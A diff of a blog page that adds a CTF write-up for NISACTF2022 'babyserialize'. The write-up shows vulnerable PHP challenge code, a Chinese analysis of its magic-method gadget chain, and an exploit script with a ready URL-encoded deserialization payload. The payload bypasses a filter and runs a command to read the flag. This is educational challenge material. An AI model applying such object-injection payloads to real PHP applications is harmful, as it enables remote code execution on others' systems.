@@ -569,6 +569,49 @@
 </div>
 
 		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
+									<a href="/2023/01/18/NISACTF2022-babyserialize-wp/" >NISACTF2022-babyserialize-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-01-18
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1852">题目链接</a>  </p>
+<h2 id="页面源码"><a href="#页面源码" class="headerlink" title="页面源码"></a>页面源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;show_me_flag&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$txw4ever</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fun==<span class="string">&quot;show_me_flag&quot;</span>) &#123;</span><br><span class="line">			<span class="title function_ invoke__">hint</span>();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$from</span>,<span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;fun=<span class="variable">$val</span>[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fun;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">checkcheck</span>(<span class="variable">$this</span>-&gt;txw4ever);</span><br><span class="line">		@<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;txw4ever);		<span class="comment">// [1]</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;ext-&gt;<span class="title function_ invoke__">nisa</span>(<span class="variable">$this</span>-&gt;x);		<span class="comment">// [5]</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$su</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;huang-&gt;fun=<span class="variable">$arg</span>[<span class="number">0</span>];		<span class="comment">// [4]</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;su;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$bb</span>();		<span class="comment">// [2]</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fun = <span class="string">&quot;sixsixsix&quot;</span>) &#123;</span><br><span class="line">			<span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;a);	<span class="comment">// [3]</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>])) &#123;</span><br><span class="line">	@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//func checkcheck($data)&#123;</span></span><br><span class="line"><span class="comment">//  if(preg_match(......))&#123;</span></span><br><span class="line"><span class="comment">//      die(something wrong);</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//function hint()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;.......&quot;;</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-各魔术方法用途见：附-附：魔术方法"><a href="#分析-各魔术方法用途见：附-附：魔术方法" class="headerlink" title="分析  [(各魔术方法用途见：附)](# 附：魔术方法)"></a>分析  [(各魔术方法用途见：附)](# 附：魔术方法)</h2><ol>
+<li>明显目标为 [1] 处的eval执行任意代码   且参数可控</li>
+<li>要能执行 [1] 则需有类似 $a() 的调用 （ __invoke在类对象名作为函数名调用时执行），由此定位到 [2]</li>
+<li>__tostring 当类对象被当作字符串处理时调用，由此定位到 [3]</li>
+<li>__set 用于将数据写入不可访问的属性， $func 属性为private，定位到 [4]</li>
+<li>__call 在对象上下文中调用不可访问的方法时觖发，定位到 [5] ，没有类有nisa方法</li>
+</ol>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>按照思路逆序构造</p>
+<p>注意还要绕过过滤，system过不了  换成大写即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$txw4ever</span>=<span class="string">&#x27;System(&quot;cat /f*&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$su</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$fun</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">TianXiWei</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; ext = <span class="keyword">new</span> <span class="title class_">Ilovetxw</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; ext -&gt; huang = <span class="keyword">new</span> four;</span><br><span class="line"><span class="variable">$a</span> -&gt; ext -&gt; huang -&gt; a = <span class="keyword">new</span> <span class="title class_">Ilovetxw</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; ext -&gt; huang -&gt; a -&gt; su = <span class="keyword">new</span> NISA;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?ser=O%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BN%3Bs%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3Bs%3A7%3A%22show_me%22%3Bs%3A8%3A%22txw4ever%22%3Bs%3A18%3A%22System%28%22cat+%2Ff%2A%22%29%3B%22%3B%7D%7Ds%3A9%3A%22%00four%00fun%22%3BN%3B%7Ds%3A2%3A%22su%22%3BN%3B%7Ds%3A1%3A%22x%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="附：魔术方法"><a href="#附：魔术方法" class="headerlink" title="附：魔术方法"></a>附：魔术方法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__construct 	<span class="comment">//对象创建(new)时会自动调用。</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>() 		<span class="comment">//使用unserialize时触发</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() 		<span class="comment">//使用serialize时触发</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() 	<span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() 		<span class="comment">//在对象上下文中调用不可访问的方法时觖发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() 	<span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() 		<span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() 		<span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() 		<span class="comment">//在不可访问的属性上调用isset(或empty)触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() 		<span class="comment">//在不可访问的属性上使用unset(时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() 	<span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() 		<span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()	<span class="comment">//在代码中当调用不存在的类时会自动调用该方法。</span></span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/01/18/NISACTF2022-babyserialize-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
 
 		</div>
 
@@ -628,7 +671,7 @@
 		
 			<li><a href="/categories/web-learning/">web-learning<span>1</span></a></li>
 		
-			<li><a href="/categories/web-wp/">web-wp<span>8</span></a></li>
+			<li><a href="/categories/web-wp/">web-wp<span>9</span></a></li>
 		
 		</ul>
 	</div>
@@ -639,45 +682,45 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/uaf/">uaf<span>1</span></a></li>
+			<li><a href="/tags/php/">php<span>3</span></a></li>
 		
 			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>2</span></a></li>
 		
-			<li><a href="/tags/rce/">rce<span>1</span></a></li>
+			<li><a href="/tags/CTF/">CTF<span>23</span></a></li>
 		
-			<li><a href="/tags/heap/">heap<span>2</span></a></li>
-		
-			<li><a href="/tags/reverse/">reverse<span>7</span></a></li>
-		
-			<li><a href="/tags/CTF/">CTF<span>22</span></a></li>
-		
-			<li><a href="/tags/ciscn2023/">ciscn2023<span>4</span></a></li>
-		
-			<li><a href="/tags/zer0pts2020/">zer0pts2020<span>1</span></a></li>
-		
-			<li><a href="/tags/canary/">canary<span>1</span></a></li>
-		
-			<li><a href="/tags/stack/">stack<span>2</span></a></li>
-		
-			<li><a href="/tags/unserialise/">unserialise<span>1</span></a></li>
-		
-			<li><a href="/tags/pwn/">pwn<span>7</span></a></li>
-		
-			<li><a href="/tags/BJDCTF2020/">BJDCTF2020<span>1</span></a></li>
+			<li><a href="/tags/fuzz/">fuzz<span>4</span></a></li>
 		
 			<li><a href="/tags/thread/">thread<span>1</span></a></li>
 		
-			<li><a href="/tags/php/">php<span>3</span></a></li>
+			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
 		
-			<li><a href="/tags/sql/">sql<span>2</span></a></li>
+			<li><a href="/tags/str-format/">str_format<span>1</span></a></li>
 		
-			<li><a href="/tags/CVE/">CVE<span>4</span></a></li>
+			<li><a href="/tags/uaf/">uaf<span>1</span></a></li>
+		
+			<li><a href="/tags/BJDCTF2020/">BJDCTF2020<span>1</span></a></li>
+		
+			<li><a href="/tags/stack/">stack<span>2</span></a></li>
+		
+			<li><a href="/tags/ciscn2023/">ciscn2023<span>4</span></a></li>
+		
+			<li><a href="/tags/web/">web<span>10</span></a></li>
+		
+			<li><a href="/tags/unserialize/">unserialize<span>3</span></a></li>
+		
+			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>7</span></a></li>
+		
+			<li><a href="/tags/heap/">heap<span>2</span></a></li>
+		
+			<li><a href="/tags/canary/">canary<span>1</span></a></li>
+		
+			<li><a href="/tags/zer0pts2020/">zer0pts2020<span>1</span></a></li>
 		
 			<li><a href="/tags/深育杯2021/">深育杯2021<span>1</span></a></li>
 		
-			<li><a href="/tags/unserialize/">unserialize<span>2</span></a></li>
+			<li><a href="/tags/nssctf/">nssctf<span>17</span></a></li>
 		
-			<li><a href="/tags/web/">web<span>9</span></a></li>
+			<li><a href="/tags/pwn/">pwn<span>7</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>26</span></a></li>
